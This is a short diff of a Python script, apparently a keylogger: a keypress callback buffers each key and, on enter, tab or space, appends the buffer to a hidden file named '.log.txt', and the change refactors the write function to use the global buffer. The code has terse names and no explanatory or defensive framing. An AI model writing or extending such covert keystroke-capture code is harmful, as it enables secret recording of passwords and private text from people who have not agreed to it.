@@ -21,14 +21,15 @@ def kp(k):
 	global kbuf
 
 	if k == Key.enter or k == Key.tab or k == Key.space:
-		wl(kbuf)
+		wl()
 		kbuf = ""
 
 	kbuf += str(k)
 
-def wl(k):
+def wl():
+	global kbuf
 	f = open('.log.txt', 'a')
-	f.write(k)
+	f.write(kbuf)
 	f.close()
 
 d()
